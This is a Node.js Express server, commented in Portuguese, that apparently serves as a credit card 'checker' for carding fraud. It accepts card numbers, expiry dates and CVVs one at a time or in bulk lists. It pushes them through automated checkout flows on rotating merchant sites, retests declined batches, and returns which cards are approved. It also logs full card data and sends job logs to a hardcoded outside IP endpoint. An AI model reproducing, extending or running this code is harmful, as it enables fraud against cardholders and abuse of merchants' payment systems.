const express = require('express');
const { checkCard, retestCard } = require('./paymentChecker');
const { getNextSite } = require('./paymentChecker');
const logSender = require('./logSender');

const app = express();
const PORT = 3001;

// Inicializa logSender (accessKey será setado por request)
logSender.init({
  checkerId: 'cielo',
  accessKey: '',
  endpoint: 'http://179.197.233.196/workcenter/checker/log_receiver.php'
});

// Map de tokens de cancelamento por access_key
const cancelTokens = new Map();

function checkCancelled(accessKey) {
  return cancelTokens.get(accessKey) === true;
}

function setCancelled(accessKey) {
  cancelTokens.set(accessKey, true);
  // Limpa após 5 min para não vazar memória
  setTimeout(() => cancelTokens.delete(accessKey), 5 * 60 * 1000);
}

app.use(express.json());

// /check — 1 cartão por vez, browser próprio, sem reteste
app.post('/check', async (req, res) => {
  const { cardNumber, expiryMonth, expiryYear, cvv, access_key } = req.body;

  if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
    return res.status(400).json({ error: 'Campos obrigatórios: cardNumber, expiryMonth, expiryYear, cvv' });
  }

  // Seta access_key do job para logs
  if (access_key) logSender.setAccessKey(access_key);

  console.log(`[${new Date().toISOString()}] /check: ${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`);

  try {
    const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv);
    console.log(`[${new Date().toISOString()}] /check resultado: ${cardNumber} - ${result.status}`);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: error.message });
  } finally {
    // Limpa access_key após processar
    logSender.setAccessKey('');
  }
});

// /bulk — lista de cartões com fila + reteste na mesma aba após DECLINED
// Body: { "cards": ["cc|mm|yyyy|cvv", ...], "threads": 3, "access_key": "..." }
app.post('/bulk', async (req, res) => {
  const { cards, threads = 3, access_key } = req.body;

  if (!cards || !Array.isArray(cards) || cards.length === 0) {
    return res.status(400).json({ error: 'Campo obrigatório: cards (array de strings "cc|mm|yyyy|cvv")' });
  }

  // Seta access_key do job para logs
  if (access_key) logSender.setAccessKey(access_key);

  const lines = cards.map(c => c.trim()).filter(Boolean);
  const THREADS = Math.max(1, Math.min(parseInt(threads), 10));

  console.log(`[${new Date().toISOString()}] /bulk: ${lines.length} cartões, ${THREADS} threads`);

  const results = [];
  let nextCardIndex = 0;

  async function worker() {
    let currentBrowser = null;
    let currentPage = null;

    try {
      while (true) {
        // Verifica cancelamento antes de cada cartão
        if (access_key && checkCancelled(access_key)) {
          console.log(`[${new Date().toISOString()}] /bulk cancelado: ${access_key}`);
          return;
        }

        const cardIdx = nextCardIndex++;
        if (cardIdx >= lines.length) return;

        const cardLine = lines[cardIdx];
        const [cardNumber, expiryMonth, expiryYear, cvv] = cardLine.split('|');
        if (!cardNumber || !expiryMonth || !expiryYear || !cvv) continue;

        if (currentBrowser && !currentBrowser.isConnected()) {
          currentBrowser = null;
          currentPage = null;
        }
        if (currentPage && currentPage.isClosed()) {
          currentPage = null;
        }

        const site = getNextSite();

        try {
          const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv, currentPage, currentBrowser, true, site);

          if (result && result.browser) {
            currentBrowser = result.browser;
            currentPage = result.page;
          }

          const status = result && result.status;
          const isTimeout = result && result.errorReason === 'Falha após 3 tentativas (timeout/erro de navegação)';

          results.push({ cardNumber, expiryMonth, expiryYear, cvv, status: isTimeout ? 'ERROR' : status, errorReason: result ? result.errorReason : null, duration: result ? result.duration : null });

          console.log(`[${new Date().toISOString()}] ${cardNumber} - ${status}`);

          // Só APPROVED finaliza sem reteste. Qualquer outro status (DECLINED, REPROVADA, fraud, ERROR, etc) retesta 2x na mesma aba
          const isApproved = status === 'APPROVED';

          if (isTimeout || isApproved) {
            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              currentBrowser = null;
              currentPage = null;
            }
          } else {
            // Retesta os próximos 2 cards na mesma aba (qualquer status != APPROVED)
            // Usa retestCard que reutiliza a tela de pagamento sem refazer o fluxo completo
            for (let r = 0; r < 2; r++) {
              // Verifica cancelamento antes de cada reteste
              if (access_key && checkCancelled(access_key)) {
                console.log(`[${new Date().toISOString()}] /bulk cancelado durante reteste: ${access_key}`);
                return;
              }

              const retestIdx = nextCardIndex++;
              if (retestIdx >= lines.length) break;

              const retestLine = lines[retestIdx];
              const [rc, rm, ry, rcv] = retestLine.split('|');
              if (!rc || !rm || !ry || !rcv) continue;

              console.log(`[${new Date().toISOString()}] [RETESTE ${r + 1}/2] ${rc}`);

              let retestResult;
              try {
                retestResult = await retestCard(currentPage, currentBrowser, rc, rm, ry, rcv, site);
              } catch (err) {
                retestResult = { status: 'ERROR', errorReason: err.message };
              }

              // retestCard não retorna browser/page, mantém os atuais
              results.push({ cardNumber: rc, expiryMonth: rm, expiryYear: ry, cvv: rcv, status: retestResult ? retestResult.status : 'ERROR', errorReason: retestResult ? retestResult.errorReason : null, duration: 'reteste' });

              // Se algum reteste der APPROVED, para
              if (retestResult && retestResult.status === 'APPROVED') break;
            }

            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              currentBrowser = null;
              currentPage = null;
            }
          }
        } catch (error) {
          results.push({ cardNumber, expiryMonth, expiryYear, cvv, status: 'ERROR', errorReason: error.message });
          if (currentBrowser) {
            try { await currentBrowser.close(); } catch (e) {}
            currentBrowser = null;
            currentPage = null;
          }
        }
      }
    } finally {
      if (currentBrowser) {
        try { await currentBrowser.close(); } catch (e) {}
      }
    }
  }

  try {
    const workerCount = Math.min(THREADS, lines.length);
    await Promise.all(Array.from({ length: workerCount }, () => worker()));
    console.log(`[${new Date().toISOString()}] /bulk concluído: ${results.length} resultados`);
    res.json({ total: results.length, results, cancelled: false });
  } catch (error) {
    res.status(500).json({ error: error.message });
  } finally {
    // Limpa access_key após processar
    logSender.setAccessKey('');
  }
});

// /bulk/cancel — cancela job em andamento por access_key
app.post('/bulk/cancel', (req, res) => {
  const { access_key } = req.body;
  if (!access_key) {
    return res.status(400).json({ error: 'access_key obrigatório' });
  }
  setCancelled(access_key);
  console.log(`[${new Date().toISOString()}] /bulk/cancel: ${access_key}`);
  res.json({ success: true, message: 'Cancelamento solicitado' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(PORT, () => {
  console.log(`API rodando em http://localhost:${PORT}`);
});